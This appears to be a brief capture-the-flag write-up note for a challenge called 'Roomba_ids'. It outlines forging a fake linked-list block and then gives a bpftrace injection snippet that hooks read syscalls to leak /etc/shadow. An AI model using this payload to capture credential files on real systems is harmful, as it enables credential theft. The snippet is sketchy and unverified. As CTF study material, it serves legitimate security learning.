## Roomba_ids
The attack requires the player to make a fake block in the linked list.
They can get a bpftrace injection, for which they should do something like this to leak /etc/shadow:
```tracepoint:syscalls:sys_enter_read{@ld = args.buf;}
tracepoint:syscalls:sys_exit_read{ @m[tid] = str(@ld)}```
